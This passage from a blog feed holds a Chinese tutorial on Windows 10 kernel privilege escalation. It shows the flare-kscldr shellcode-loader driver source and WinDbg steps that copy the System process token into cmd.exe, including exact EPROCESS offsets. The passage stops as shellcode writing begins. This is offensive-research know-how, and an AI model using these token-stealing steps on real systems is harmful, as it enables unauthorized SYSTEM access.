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</div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      The article has been encrypted, please enter your password to view.&lt;br&gt;
    
    </summary>
    
      <category term="学习记录" scheme="http://blog.wonderkun.cc/categories/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
    
    
      <category term="binary" scheme="http://blog.wonderkun.cc/tags/binary/"/>
    
      <category term="ctf" scheme="http://blog.wonderkun.cc/tags/ctf/"/>
    
      <category term="php" scheme="http://blog.wonderkun.cc/tags/php/"/>
    
      <category term="web" scheme="http://blog.wonderkun.cc/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>windows10内核态提权方法汇总</title>
    <link href="http://blog.wonderkun.cc/2021/08/22/windows10%E5%86%85%E6%A0%B8%E6%80%81%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%B1%87%E6%80%BB/"/>
    <id>http://blog.wonderkun.cc/2021/08/22/windows10内核态提权方法汇总/</id>
    <published>2021-08-22T09:25:59.000Z</published>
    <updated>2024-11-18T11:46:14.718Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>近期由于某些项目的原因，突然激发了我对windows内核提权原理的兴趣。于是就想研究一下，在拿到一个内核态任意代码执行漏洞后，到底有多少种方法常用的方法还能在windows 10上成功提权，针对这些不同的提权方法到底有没有一个比较通用的拦截方案？ 所以就有了如下这篇学习记录。</p><p>不同于ring3层的shellcode那样功能多样化，在的漏洞利用过程中，ring0层的shellcode通常用来获取 <code>nt authority\system</code>权限，本文基于的前提是已经有一个内核态任意代码执行漏洞的前提下，学习三种还能够在windows 10 上成功提权的方法，并写出相对应的shellcode。 </p><a id="more"></a><h2 id="环境的准备"><a href="#环境的准备" class="headerlink" title="环境的准备"></a>环境的准备</h2><p>为了进行内核态的shellcode测试，那首先就需要先有一个内核态的任意代码执行漏洞。最简单的思路就是写一个驱动，它能够从用户态读取shellcode过来，然后在内核中当作代码执行。非常幸运的这样的代码fireeye已经帮我们实现了<a href="https://github.com/fireeye/flare-kscldr" target="_blank" rel="noopener">https://github.com/fireeye/flare-kscldr</a>,只需要下载编译就可以使用。</p><p>不过在使用之前我们还是简单的看一下<code>flare-kscldr</code> 的代码逻辑，帮助我们理解。</p><p>驱动中主要实现了如下两个irp请求的响应函数：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">DriverObject-&gt;MajorFunction[IRP_MJ_WRITE] = scldrWrite;</span><br><span class="line">DriverObject-&gt;MajorFunction[IRP_MJ_DEVICE_CONTROL] = scldrDeviceControl;</span><br></pre></td></tr></table></figure><p><code>IRP_MJ_WRITE</code>主要响应写请求，实现从用户态将shellcode写入驱动的设备扩展。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">NTSTATUS</span><br><span class="line">scldrWrite(</span><br><span class="line">    __inout PDEVICE_OBJECT DeviceObject,</span><br><span class="line">    __inout PIRP Irp</span><br><span class="line">)</span><br><span class="line">&#123;</span><br><span class="line">    NTSTATUS nts = STATUS_UNSUCCESSFUL;</span><br><span class="line">    ULONG len = <span class="number">0</span>;</span><br><span class="line">    PVOID src = <span class="literal">NULL</span>;</span><br><span class="line">    PIO_STACK_LOCATION io_stack = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ScldrDevExt</span> *<span class="title">dev_ext</span> = <span class="title">NULL</span>;</span></span><br><span class="line">    BOOLEAN took_mutex = FALSE;</span><br><span class="line"></span><br><span class="line">    ASSERT(KeGetCurrentIrql() &lt;= APC_LEVEL);</span><br><span class="line"></span><br><span class="line">    io_stack = IoGetCurrentIrpStackLocation(Irp);</span><br><span class="line"></span><br><span class="line">    len = io_stack-&gt;Parameters.Write.Length;</span><br><span class="line"></span><br><span class="line">    PDEBUG(<span class="string">"scldrWrite(%d)\n"</span>, len);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Assume failure</span></span><br><span class="line">    Irp-&gt;IoStatus.Information = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    dev_ext = (struct ScldrDevExt *)DeviceObject-&gt;DeviceExtension;</span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">NULL</span> == dev_ext)</span><br><span class="line">    &#123;</span><br><span class="line">        len = <span class="number">0</span>;</span><br><span class="line">        nts = STATUS_INVALID_DEVICE_STATE;</span><br><span class="line">        <span class="keyword">goto</span> exit_scldrWrite;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ExAcquireFastMutex(&amp;dev_ext-&gt;mutex);</span><br><span class="line">    took_mutex = TRUE;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (len &gt; dev_ext-&gt;max_len)</span><br><span class="line">    &#123;</span><br><span class="line">        nts = STATUS_BUFFER_OVERFLOW;</span><br><span class="line">        len = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (!len)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (dev_ext-&gt;buf)</span><br><span class="line">            &#123;</span><br><span class="line">                ExFreePoolWithTag(dev_ext-&gt;buf, TAG);</span><br><span class="line">                dev_ext-&gt;buf = <span class="literal">NULL</span>;</span><br><span class="line">                dev_ext-&gt;len = <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            src = Irp-&gt;AssociatedIrp.SystemBuffer;</span><br><span class="line">            nts = scldrDevExtSetBufUnsafe(dev_ext, (PUCHAR)src, len);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">exit_scldrWrite:</span><br><span class="line">    <span class="keyword">if</span> (took_mutex)</span><br><span class="line">    &#123;</span><br><span class="line">        ExReleaseFastMutex(&amp;dev_ext-&gt;mutex);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Irp-&gt;IoStatus.Information = len;</span><br><span class="line">    Irp-&gt;IoStatus.Status = nts;</span><br><span class="line">    IoCompleteRequest(Irp, IO_NO_INCREMENT);</span><br><span class="line">    <span class="keyword">return</span> nts;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>IRP_MJ_DEVICE_CONTROL</code>irp主要响应如下几个控制代码：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IOCTL_kscldr_setmaxlength \</span></span><br><span class="line">    CTL_CODE( \</span><br><span class="line">            FILE_DEVICE_UNKNOWN, \</span><br><span class="line">            KSCLDR_FUNCTION_SET_MAX_LENGTH, \</span><br><span class="line">            METHOD_BUFFERED, \</span><br><span class="line">            FILE_WRITE_DATA \</span><br><span class="line">       )</span><br><span class="line"></span><br><span class="line"><span class="comment">// 是否在执行shellcode之前设置断点，方便调试</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IOCTL_kscldr_setbreakpointdisposition \</span></span><br><span class="line">    CTL_CODE( \</span><br><span class="line">            FILE_DEVICE_UNKNOWN, \</span><br><span class="line">            KSCLDR_FUNCTION_SET_BREAKPOINT_DISPOSITION, \</span><br><span class="line">            METHOD_BUFFERED, \</span><br><span class="line">            FILE_WRITE_DATA \</span><br><span class="line">       )</span><br><span class="line"><span class="comment">// 调用shellcode</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IOCTL_kscldr_callsc \</span></span><br><span class="line">    CTL_CODE( \</span><br><span class="line">            FILE_DEVICE_UNKNOWN, \</span><br><span class="line">            KSCLDR_FUNCTION_CALL, \</span><br><span class="line">            METHOD_BUFFERED, \</span><br><span class="line">            FILE_EXECUTE \</span><br><span class="line">       )</span><br></pre></td></tr></table></figure><p>至于其他的双机调试环境和此工具的使用方法就不再细说了，可以查看其他的windows内核调试教程。</p><h2 id="方法一：Token窃取"><a href="#方法一：Token窃取" class="headerlink" title="方法一：Token窃取"></a>方法一：Token窃取</h2><p>token窃取是windows内核提权最常用的办法，其核心的原理是用<code>system</code>进程中的token替换当前漏洞利用进程的token，实现身份伪造。运行中的Windows进程所关联的用户帐户和访问权限由一个叫做令牌（token）的内核对象仲裁。用于跟踪各种特定进程数据的内核数据结构包含了一个指向token的指针。当进程试图去执行各种操作时，比如打开一个文件，token中的账户权限会用于和所需的权限进行比较，以此决定该操作是否可行。</p><p>因为token指针只是内核内存中的数据，对于在内核模式中执行的代码来说，将其更改为指向不同的token以赋予该进程一个不同的权限集，这是非常容易的事情。接下来我们就先用windbg进行效果演示，将普通用户权限的<code>cmd.exe</code> 进程修改为<code>system</code> 权限。</p><h3 id="使用windbg修改提权"><a href="#使用windbg修改提权" class="headerlink" title="使用windbg修改提权"></a>使用windbg修改提权</h3><p>首先先获取<code>system</code>进程的<code>EPROCESS</code>地址：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>: kd&gt; !<span class="built_in">process</span> <span class="number">0</span> <span class="number">0</span> system </span><br><span class="line">PROCESS ffffa98848069080</span><br><span class="line">    SessionId: none  Cid: <span class="number">0004</span>    Peb: <span class="number">00000000</span>  ParentCid: <span class="number">0000</span></span><br><span class="line">    DirBase: <span class="number">001</span>ad002  ObjectTable: ffffcc077de05d40  HandleCount: <span class="number">2486.</span></span><br><span class="line">    Image: System</span><br></pre></td></tr></table></figure><p>下面查看<code>EPROCESS</code>的数据：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>: kd&gt; dt _EPROCESS  ffffa98848069080  </span><br><span class="line">ntdll!_EPROCESS</span><br><span class="line">   +<span class="number">0x000</span> Pcb              : _KPROCESS</span><br><span class="line">   +<span class="number">0x2e0</span> ProcessLock      : _EX_PUSH_LOCK</span><br><span class="line">   ..... </span><br><span class="line">   +<span class="number">0x358</span> ExceptionPortState : <span class="number">0</span>y000</span><br><span class="line">   +<span class="number">0x360</span> Token            : _EX_FAST_REF</span><br><span class="line">   +<span class="number">0x368</span> MmReserved       : <span class="number">0</span></span><br></pre></td></tr></table></figure><p>可以看到<code>Token</code>是一个<code>_EX_FAST_REF</code>结构，这是windows，它依赖于一种假定，在16字节的边界上需要将内核数据结构对齐到内存中。这意味着一个指向token或其他任何内核对象的指针最低的4个位永远都是0（十六进制就是最后一个数永远为0）。Windows因此可以自由的使用该指针的低4位用于其他目的（在本例中为可用于内部优化的引用计数)。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>: kd&gt; dt _EX_FAST_REF</span><br><span class="line">ntdll!_EX_FAST_REF</span><br><span class="line">   +<span class="number">0x000</span> Object           : Ptr64 Void</span><br><span class="line">   +<span class="number">0x000</span> RefCnt           : Pos <span class="number">0</span>, <span class="number">4</span> Bits</span><br><span class="line">   +<span class="number">0x000</span> Value            : Uint8B</span><br></pre></td></tr></table></figure><p>只需要将<code>_EX_FAST_REF</code>的数据低4bit置零，就可以获取到token的数据结构了。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// eprocess 偏移为 0x360 的位置存储的是token ，这个偏移与其他版本的windows有区别</span></span><br><span class="line"><span class="number">0</span>: kd&gt; dq ffffa98848069080 + <span class="number">0x360</span>  L1  </span><br><span class="line">ffffa988`<span class="number">480693e0</span>  ffffcc07`<span class="number">7</span>de0772d</span><br><span class="line"><span class="comment">// 将最后 4bit 置 0</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>: kd&gt; !token ffffcc07`<span class="number">7</span>de07720 </span><br><span class="line">_TOKEN <span class="number">0xffffcc077de07720</span></span><br><span class="line">TS Session ID: <span class="number">0</span></span><br><span class="line">User: S<span class="number">-1</span><span class="number">-5</span><span class="number">-18</span></span><br><span class="line">User Groups: </span><br><span class="line"> <span class="number">00</span> S<span class="number">-1</span><span class="number">-5</span><span class="number">-32</span><span class="number">-544</span></span><br><span class="line">    Attributes - Default Enabled Owner </span><br><span class="line"> <span class="number">01</span> S<span class="number">-1</span><span class="number">-1</span><span class="number">-0</span></span><br><span class="line">    Attributes - Mandatory Default Enabled </span><br><span class="line"> <span class="number">02</span> S<span class="number">-1</span><span class="number">-5</span><span class="number">-11</span></span><br><span class="line">    Attributes - Mandatory Default Enabled </span><br><span class="line"> <span class="number">03</span> S<span class="number">-1</span><span class="number">-16</span><span class="number">-16384</span></span><br><span class="line">    Attributes - GroupIntegrity GroupIntegrityEnabled </span><br><span class="line">Primary Group: S<span class="number">-1</span><span class="number">-5</span><span class="number">-18</span></span><br><span class="line">Privs: </span><br><span class="line"> <span class="number">02</span> <span class="number">0x000000002</span> SeCreateTokenPrivilege            Attributes - </span><br><span class="line"> <span class="number">03</span> <span class="number">0x000000003</span> SeAssignPrimaryTokenPrivilege     Attributes - </span><br><span class="line"> <span class="number">04</span> <span class="number">0x000000004</span> SeLockMemoryPrivilege             Attributes - Enabled Default </span><br><span class="line"> <span class="number">05</span> <span class="number">0x000000005</span> SeIncreaseQuotaPrivilege          Attributes - </span><br><span class="line"> <span class="number">07</span> <span class="number">0x000000007</span> SeTcbPrivilege                    Attributes - Enabled Default </span><br><span class="line"> <span class="number">08</span> <span class="number">0x000000008</span> SeSecurityPrivilege               Attributes - </span><br><span class="line"> <span class="number">09</span> <span class="number">0x000000009</span> SeTakeOwnershipPrivilege          Attributes - </span><br><span class="line"> <span class="number">10</span> <span class="number">0x00000000a</span> SeLoadDriverPrivilege             Attributes - </span><br><span class="line"> <span class="number">11</span> <span class="number">0x00000000b</span> SeSystemProfilePrivilege          Attributes - Enabled Default </span><br><span class="line"> <span class="number">12</span> <span class="number">0x00000000c</span> SeSystemtimePrivilege             Attributes - </span><br><span class="line"> <span class="number">13</span> <span class="number">0x00000000d</span> SeProfileSingleProcessPrivilege   Attributes - Enabled Default </span><br><span class="line"> <span class="number">14</span> <span class="number">0x00000000e</span> SeIncreaseBasePriorityPrivilege   Attributes - Enabled Default </span><br><span class="line"> <span class="number">15</span> <span class="number">0x00000000f</span> SeCreatePagefilePrivilege         Attributes - Enabled Default </span><br><span class="line"> <span class="number">16</span> <span class="number">0x000000010</span> SeCreatePermanentPrivilege        Attributes - Enabled Default </span><br><span class="line"> <span class="number">17</span> <span class="number">0x000000011</span> SeBackupPrivilege                 Attributes - </span><br><span class="line"> <span class="number">18</span> <span class="number">0x000000012</span> SeRestorePrivilege                Attributes - </span><br><span class="line"> <span class="number">19</span> <span class="number">0x000000013</span> SeShutdownPrivilege               Attributes - </span><br><span class="line"> <span class="number">20</span> <span class="number">0x000000014</span> SeDebugPrivilege                  Attributes - Enabled Default </span><br><span class="line"> <span class="number">21</span> <span class="number">0x000000015</span> SeAuditPrivilege                  Attributes - Enabled Default </span><br><span class="line"> <span class="number">22</span> <span class="number">0x000000016</span> SeSystemEnvironmentPrivilege      Attributes - </span><br><span class="line"> <span class="number">23</span> <span class="number">0x000000017</span> SeChangeNotifyPrivilege           Attributes - Enabled Default </span><br><span class="line"> <span class="number">25</span> <span class="number">0x000000019</span> SeUndockPrivilege                 Attributes - </span><br><span class="line"> <span class="number">28</span> <span class="number">0x00000001c</span> SeManageVolumePrivilege           Attributes - </span><br><span class="line"> <span class="number">29</span> <span class="number">0x00000001d</span> SeImpersonatePrivilege            Attributes - Enabled Default </span><br><span class="line"> <span class="number">30</span> <span class="number">0x00000001e</span> SeCreateGlobalPrivilege           Attributes - Enabled Default </span><br><span class="line"> <span class="number">31</span> <span class="number">0x00000001f</span> SeTrustedCredManAccessPrivilege   Attributes - </span><br><span class="line"> <span class="number">32</span> <span class="number">0x000000020</span> SeRelabelPrivilege                Attributes - </span><br><span class="line"> <span class="number">33</span> <span class="number">0x000000021</span> SeIncreaseWorkingSetPrivilege     Attributes - Enabled Default </span><br><span class="line"> <span class="number">34</span> <span class="number">0x000000022</span> SeTimeZonePrivilege               Attributes - Enabled Default </span><br><span class="line"> <span class="number">35</span> <span class="number">0x000000023</span> SeCreateSymbolicLinkPrivilege     Attributes - Enabled Default </span><br><span class="line"> <span class="number">36</span> <span class="number">0x000000024</span> SeDelegateSessionUserImpersonatePrivilege  Attributes - Enabled Default </span><br><span class="line">Authentication ID:         (<span class="number">0</span>,<span class="number">3e7</span>)</span><br><span class="line">Impersonation Level:       Anonymous</span><br><span class="line">TokenType:                 Primary</span><br><span class="line">Source: *SYSTEM*           TokenFlags: <span class="number">0x2000</span> ( Token NOT in use ) </span><br><span class="line">Token ID: <span class="number">3</span>eb              ParentToken ID: <span class="number">0</span></span><br><span class="line">Modified ID:               (<span class="number">0</span>, <span class="number">3</span>ec)</span><br><span class="line">RestrictedSidCount: <span class="number">0</span>      RestrictedSids: <span class="number">0x0000000000000000</span></span><br><span class="line">OriginatingLogonSession: <span class="number">0</span></span><br><span class="line">PackageSid: (null)</span><br><span class="line">CapabilityCount: <span class="number">0</span>      Capabilities: <span class="number">0x0000000000000000</span></span><br><span class="line">LowboxNumberEntry: <span class="number">0x0000000000000000</span></span><br><span class="line">Security Attributes:</span><br><span class="line">Invalid AUTHZBASEP_SECURITY_ATTRIBUTES_INFORMATION with no claims</span><br><span class="line"><span class="built_in">Process</span> Token TrustLevelSid: S<span class="number">-1</span><span class="number">-19</span><span class="number">-1024</span><span class="number">-8192</span></span><br></pre></td></tr></table></figure><p>可以看到system的权限跟这个数据一致。</p><p><img src="https://pic.wonderkun.cc//uploads/note/20210821195011.png" alt=""></p><p>下一步就是定位<code>cmd.exe</code>进程的<code>_EPROCESS</code>结构并替换偏移0x360的token指针值为System的token地址。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>: kd&gt; !<span class="built_in">process</span> <span class="number">0</span> <span class="number">0</span> cmd.exe </span><br><span class="line">PROCESS ffffa988480e30c0</span><br><span class="line">    SessionId: <span class="number">1</span>  Cid: <span class="number">07b</span>c    Peb: a26a142000  ParentCid: <span class="number">1340</span></span><br><span class="line">    DirBase: <span class="number">9</span>a1f6002  ObjectTable: ffffcc0783789d80  HandleCount:  <span class="number">70.</span></span><br><span class="line">    Image: cmd.exe</span><br><span class="line"></span><br><span class="line"><span class="number">1</span>: kd&gt; eq ffffa988480e30c0 + <span class="number">0x360</span>   ffffcc07`<span class="number">7</span>de07720</span><br></pre></td></tr></table></figure><p>然后看一下cmd.exe的权限，发现已经提权成功了。</p><p><img src="https://pic.wonderkun.cc//uploads/note/20210821195838.png" alt=""></p><h3 id="写shellcode"><a href="#写shellcode" class="headerlink" title="写shellcode"></a>写shellcode</h3><p>按照上面的思路，首先需要获取到进程的<code>EPROCESS</code>结构体的地址，在内核中可以获取到<code>EPROCESS</code>结构的函数是<code>PsGetCurrentProcess</code></p><p><img src="https://pic.wonderkun.cc//uploads/note/20210821200447.png" alt=""></p><p>我们反汇编这个函数的代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>: kd&gt; uf PsGetCurrentProcess </span><br><span class="line">nt!PsGetCurrentProcess:</span><br><span class="line">fffff802`<span class="number">41</span>abe0e0 <span class="number">65488b</span>042588010000 mov   rax,qword ptr gs:[<span class="number">188</span>h]</span><br><span class="line">fffff802`<span class="number">41</span>abe0e9 <span class="number">488b</span>80b8000000  mov     rax,qword ptr [rax+<span class="number">0B</span>8h]</span><br><span class="line">fffff802`<span class="number">41</span>abe0f0 c3              ret</span><br></pre></td></tr></table></figure><p>其实<code>gs:[188h]</code>的位置存贮的是<code>_KTHREAD</code>结构的地址，看一下这个结构，发现0x220的位置存储的就是<code>_KPROCESS</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>: kd&gt; dt _KTHREAD   </span><br><span class="line">ntdll!_KTHREAD</span><br><span class="line">   +<span class="number">0x000</span> Header           : _DISPATCHER_HEADER</span><br><span class="line">   ......</span><br><span class="line">   +<span class="number">0x220</span> <span class="built_in">Process</span>          : Ptr64 _KPROCESS</span><br><span class="line">   +<span class="number">0x228</span> UserAffinity     : _GROUP_AFFINITY</span><br></pre></td></tr></table></figure><p>但是函数<code>PsGetCurrentProcess</code>取的数据是 